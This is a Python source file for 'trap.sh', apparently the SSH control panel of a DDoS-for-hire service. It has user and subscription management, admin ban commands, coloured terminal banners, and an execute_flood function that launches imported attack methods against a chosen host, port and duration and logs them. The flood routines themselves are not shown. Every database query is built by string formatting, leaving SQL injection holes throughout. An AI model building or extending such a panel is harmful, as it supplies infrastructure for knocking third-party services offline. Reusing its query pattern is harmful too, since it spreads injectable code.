from logging import exception
from pickle import TRUE
from xmlrpc.client import Transport
from attacks import methodlist, method, usage
import paramiko
import sqlite3
import hashlib
import uuid
import random
import string
import sys
import io

ANSI_SEQ = "\x1b[{}m"
FG_RGB = "38;2;{};{};{}"
BG_RGB = "48;2;{};{};{}"
RESET="0"
FRAMED="51"

ATTRS = {key:code for key, code in [line.strip().split()   for line in """\
    bold 1
    faint 2
    italic 3
    underline 4
    blink 5
    fast_blink 6
    reverse 7
    conceal 8
    crossed 9
    fraktur 20
    double_underline 21
    framed 51
    encircled 52
    overlined 54\
""".split("\n")]}

#objects
class User:
    def update_ip(self, ip) -> bool:
        try:
            sql = "UPDATE users SET last_ip='{}' WHERE uid={}"
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            cursor.execute(sql.format(ip, self.uid))
            connection.close();
            return 3
        except Exception as e:
            print(e)
            return 1

    def set_password(self, newpassword) -> bool:
        try:
            sql = "UPDATE users SET hpassword='{}',salt='{}' WHERE uid={}"
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            salt = uuid.uuid4().hex
            hashedpassword = hashlib.sha512((salt + newpassword).encode("UTF-8")).hexdigest()
            cursor.execute(sql.format(hashedpassword, salt, self.uid))
            connection.close()
            return True
        except Exception as e:
            print(e)
            return False

    def ban(self, banned=True) -> bool:
        try:
            sql = "UPDATE users SET status=0 WHERE uid={}"
            if banned == False:
                sql = "UPDATE users SET status=1 WHERE uid={}"
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            cursor.execute(sql.format(self.uid))
            connection.close()
            return 2
        except Exception as e:
            print(e)
            return 1

    def get_sub(self) -> int:
        try:
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            sub = cursor.execute("SELECT sub FROM subs WHERE uid = {}".format(self.uid)).fetchone()
            connection.close()
            return int(sub)
        except Exception as e:
            return -1
    
    def get_attack_count(self) -> int:
        try:
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            val = cursor.execute(f'SELECT count(*) FROM attacks WHERE uid={self.uid}').fetchone()
            connection.close()
            return int(val[0])
        except Exception as e:
            print(e)
            return -1

    def __init__(self, username) -> None:
        connection = sqlite3.connect("./trappers.db", isolation_level=None)
        cursor = connection.cursor()
        row = cursor.execute("SELECT uid, last_ip, status, admin, super FROM users WHERE username = '{}'".format(username)).fetchone()
        uid, last_ip, status, admin, soup = row
        sub = cursor.execute("SELECT sub FROM subs WHERE uid = {}".format(uid)).fetchone()
        connection.close()
        self.username = username
        self.uid = uid #get uid from
        self.sub = sub #get sub level
        self.status = status
        self.last_ip = last_ip
        self.admin = admin #get is admin
        self.super = soup #get is super

#backend functions
def colored_(*args, **kw) -> str:
    """Extends print function to add color printing parameters in compatible terminals.
    Use the optional bg= or fg= parameters to pass colors for foreground or background
    respectively. Parameters should be a 3-sequence with RGB numbers from 0 to 255
    as string or decimal.
    Use the optional end_fg and end_bg parameters to create color gradients
    from the starting color to the ending ones.
    Other attributes can be accepted as "True" according  the keys in ATTRS
    """
    extra_options = {}
    for argname, value in list(kw.items()):
        if argname in ATTRS:
            extra_options[argname] = kw.pop(argname)

    fg_param = kw.pop("start_fg", kw.pop("fg", None))
    bg_param = kw.pop("start_bg", kw.pop("bg", None))

    start_fg = fg = tuple(int(comp) for comp in (fg_param if fg_param else (0, 0, 0)))
    start_bg = bg = tuple(int(comp) for comp in (bg_param if bg_param else (0, 0, 0)))

    end_fg = tuple(int(comp) for comp in kw.pop("end_fg", fg))
    end_bg = tuple(int(comp) for comp in kw.pop("end_bg", bg))

    original_file = kw.pop("file", sys.stdout)
    original_flush = kw.pop("flush", False)
    original_end = kw.pop("end", None)
    text_io = io.StringIO()
    print(*args, **kw, file=text_io, end="")
    text = text_io.getvalue()

    if not fg_param and not bg_param or not len(text):
        return print(*args, **kw)

    fg_gradient = start_fg != end_fg
    bg_gradient = start_bg != end_bg

    text_io = io.StringIO()

    extra_attrs = ";".join(ATTRS[key] for key in extra_options)
    if extra_attrs:
        text_io.write(ANSI_SEQ.format(extra_attrs))
    for i, character in enumerate(text):
        ansi_str = ""
        if start_fg and (i == 0 or fg_gradient):
                ansi_str = FG_RGB.format(*fg)
        #if start_bg and (i == 0 or bg_gradient):
        #    ansi_str +=  (";" if ansi_str else "") + BG_RGB.format(*bg)
        if ansi_str:
            text_io.write(ANSI_SEQ.format(ansi_str))
        text_io.write(character)
        fg = tuple(int(comp + i * (end_comp - comp) / len(text)) for comp, end_comp in zip(fg, end_fg))
        bg = tuple(int(comp + i * (end_comp - comp) / len(text)) for comp, end_comp in zip(bg, end_bg))

    text_io.write(ANSI_SEQ.format(RESET))

    return str(text_io.getvalue())

def get_user_count() -> int:
    try:
        connection = sqlite3.connect("./trappers.db", isolation_level=None)
        cursor = connection.cursor()
        val = cursor.execute('SELECT count(*) FROM users').fetchone()
        connection.close()
        return int(val[0])
    except Exception as e:
        print(e)
        return -1
def get_attack_count() -> int:
    try:
        connection = sqlite3.connect("./trappers.db", isolation_level=None)
        cursor = connection.cursor()
        val = cursor.execute('SELECT count(*) FROM attacks').fetchone()
        connection.close()
        return int(val[0])
    except Exception as e:
        print(e)
        return -1
def add_user_raw(username, password, admin, soup) -> bool:
    try:
        add_user_sql = "INSERT INTO users VALUES ({}, '{}','{}','{}','{}','{}','{}','{}')"
        connection = sqlite3.connect("./trappers.db", isolation_level=None)
        cursor = connection.cursor()
        salt = uuid.uuid4().hex
        hashedpassword = hashlib.sha512((salt + password).encode("UTF-8")).hexdigest()
        cursor.execute(add_user_sql.format(get_user_count(), username, salt, hashedpassword, '0.0.0.0', 1, admin, soup))
        connection.close()
        return True
    except Exception as e:
        return False
def banuser(chan: paramiko.Channel, usertoban: str) -> int:
    user = User(chan.transport.get_username())
    banee = User(usertoban)
    if user.admin == 0 and user.super == 0:
        return 0
    if banee.admin == 1 and user.super == 0:
        return 0
    if banee.admin == 1 and user.admin == 1 and user.super == 0:
        return 0
    if banee.super == 1 and user.super == 1:
        return 0
    return banee.ban()
def unbanuser(chan: paramiko.Channel, usertoban: str) -> int:
    user = User(chan.transport.get_username())
    banee = User(usertoban)
    if user.admin == 0 and user.super == 0:
        return 0
    if banee.admin == 1 and user.super == 0:
        return 0
    if banee.admin == 1 and user.admin == 1 and user.super == 0:
        return 0
    if banee.super == 1 and user.super == 1:
        return 0
    return banee.ban(False)

#attack methods in attacks.py
def execute_flood(chan: paramiko.Channel, method: str, params: list) -> bool:
    try:
        user = User(chan.transport.get_username())
        result = methodlist[method].attack(params)
        if result == True:
            add_atk_sql = "INSERT INTO attacks VALUES ({},{},'{}','{}','{}',{})"
            connection = sqlite3.connect("./trappers.db", isolation_level=None)
            cursor = connection.cursor()
            cursor.execute(add_atk_sql.format(get_attack_count(), int(user.uid), str(method), str(params[0]), str(params[1]), int(params[2])))
            connection.close()
        return result
    except Exception as e:
        print('e=' + e)
        raise(e)

#admin functions
def add_user(chan: paramiko.Channel, username: str, password=''.join(random.choices(string.ascii_uppercase + string.digits, k=12)), admin=0, soup=0) -> str:
    user = User(chan.transport.get_username())
    if user.admin == 0 and user.super == 0:
        return 'insufficient permissions'
    if user.admin == 0 and soup == 1:
        return 'insufficient permissions'
    result = add_user_raw(username, password, admin, soup)
    if result == True:
        return 'success'
    return 'failure'

def print_user_info(chan: paramiko.Channel, username: str):
    try:
        caller = User(chan.transport.get_username())
        if caller.admin == 0 and caller.super == 0:
            return 0
        user = User(username)
        clear_terminal(chan, False)
        zstr = ''
        pbanner = """
                      ╔═══════════════════════════╗
                      ║         [trap.sh]         ║
                      ╠═══════════════════════════╣
                      ║ [User's id]: {:<{}s}║
                      ║ [Username]: {:<{}s}║
                      ║ [User's ip]: {:<{}s}║
                      ║ [User status]: {:<{}s}║
                      ║ [Is admin]: {:<{}s}║
                      ║ [Is super]: {:<{}s}║
                      ║ [Attacks]: {:<{}s}║
                      ╚═══════════════════════════╝\n""".format(
                          str(user.uid), 13, 
                          user.username, 14, 
                          user.last_ip, 13,
                          str(user.status), 11,
                          str(user.admin), 14, 
                          str(user.super), 14, 
                          str(user.get_attack_count()), 15)
        for i in range(len(pbanner.split("\n"))):
            zstr = zstr + str(colored_(pbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
        chan.send('    ' + str(zstr[4:-6]))
        return 2
    except Exception as e:
        print(e)
        return 1

#misc functions
def send_banner(chan: paramiko.Channel):
    usr = User(chan.transport.get_username())
    zstr = ''
    pbanner = """
                  ╔═══════════════════════════╗
                  ║         [trap.sh]         ║
        ╔═════════╩═══════════════════════════╩═════════╗
        ║                                               ║
        ║       ████████╗██████╗  █████╗ ██████╗        ║
        ║       ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗       ║
        ║          ██║   ██████╔╝███████║██████╔╝       ║
        ║          ██║   ██╔══██╗██╔══██║██╔═══╝        ║
        ║          ██║   ██║  ██║██║  ██║██║            ║
        ║          ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝            ║
        ║                                               ║
        ╚═════════╦═══════════════════════════╦═════════╝
                  ║ [uid]: {:<{}s}║
                  ║ [user]: {:<{}s}║
                  ║ [your ip]: {:<{}s}║
                  ╚═══════════════════════════╝\n""".format(str(usr.uid), 19, usr.username, 18, usr.last_ip, 15)
    for i in range(len(pbanner.split("\n"))):
        zstr = zstr + str(colored_(pbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
    for i in zstr[4:-6].split("\r"):
            chan.send(i + '\r')

def clear_terminal(chan: paramiko.Channel, ShowBanner = True) -> bool:
    chan.send(chr(27) + "[2J")
    if ShowBanner == True:
        send_banner(chan)

def change_password(chan: paramiko.Channel, new: str) -> bool:
    return User(chan.transport.get_username()).set_password(new)

def close_connection(trans: Transport):
    trans.close()

def help_menu(chan: paramiko.Channel) -> bool:
    try:
        clear_terminal(chan, False)
        usr = User(chan.transport.get_username())
        sbanner = """\r
        
                    ╔═══════════════════════════╗
                    ║         [trap.sh]         ║
        ╔═══════════╬═══════════════════════════╩═══════════╗
        ║  command  ║                about                  ║
        ╠═══════════╬═══════════════════════════════════════╣"""
                        
        admin = """
        ╠═══════════╩═══════════════════════════════════════╣
        ║                      [admin]                      ║
        ╠═══════════╦═══════════════════════════════════════╣"""
        end = """
        ╚═══════════╩═══════════════════════════════════════╝\n"""
        for k,v in about.items():
            entry = """
        ║ {:<{}s} ║ {:<{}s} ║\n""".format(k, 9, v, 37)
            entry = entry[:-1]
            sbanner = sbanner + entry
        if usr.admin == 1 or usr.super == 1:
            sbanner = sbanner + admin
            for k,v in admincmds.items():
                entry = """
        ║ {:<{}s} ║ {:<{}s} ║\n""".format(k, 9, v, 37)
                entry = entry[:-1]
                sbanner = sbanner + entry
        sbanner = sbanner + end
        sbanner = sbanner[4:-1]
        zstr = ""
        for i in range(len(sbanner.split("\n"))):
            zstr = zstr + str(colored_(sbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
        
        for i in zstr.split("\r"):
            chan.send(i + '\r')
    except Exception as e:
        print(e)

def print_attacks(chan: paramiko.Channel) -> bool:
    try:
        usr = User(chan.transport.get_username())
        connection = sqlite3.connect("./trappers.db", isolation_level=None)
        cursor = connection.cursor()
        rows = cursor.execute('SELECT attack_id,method,host,port,seconds FROM attacks WHERE uid={}'.format(usr.uid)).fetchall()
        connection.close()

        clear_terminal(chan, False)
        sbanner = """\r
        
                        ╔═══════════════════════════╗
                        ║         [trap.sh]         ║
        ╔══════╦════════╬═══════════════════════════╬══════╦══════╗
        ║  ID  ║ method ║         host name         ║ port ║ time ║
        ╠══════╬════════╬═══════════════════════════╬══════╬══════╣"""
    
        admin = """
        ╠══════╩════════╩═══════════════════════════╩══════╩══════╣
        ║                       ADMIN ONLY                        ║
        ╠══════╦════════╦═══════════════════════════╦══════╦══════╣"""
        end = """
        ╚══════╩════════╩═══════════════════════════╩══════╩══════╝\n"""
        for row in rows:
            attackid,method,host,port,seconds = row
            entry = """
        ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║\n""".format(
            str(attackid), 4,
            method, 6,
            host, 25,
            port, 4,
            str(seconds), 4)
            entry = entry[:-1]
            sbanner = sbanner + entry
        sbanner = sbanner + end
        sbanner = sbanner[4:-1]
        zstr = ""
        for i in range(len(sbanner.split("\n"))):
            zstr = zstr + str(colored_(sbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
        chan.send(zstr)
    except Exception as e:
        print(e)


admincmds = {
    "ban": "Ban a user from the system",
    "user": "View the account details of a user",
    "unban": "Unban a user from the system",
    "adduser": "Add a user to the system"
}

about = {
    "help": "Show this help menu:)",
    "quit": "Quits the current session",
    "exit": "Quits the current session",
    "cls": "Clear the terminal, print banner",
    "passwd": "Change your password",
    "attacks": "List all of your attacks"
}

functions = { 
    "help": help_menu,
    "quit": close_connection,
    "exit": close_connection,
    "cls": clear_terminal,
    "passwd": change_password,
    "adduser": add_user,
    "user": print_user_info,
    "attacks": print_attacks,
    "ban": banuser,
    "unban": unbanuser
}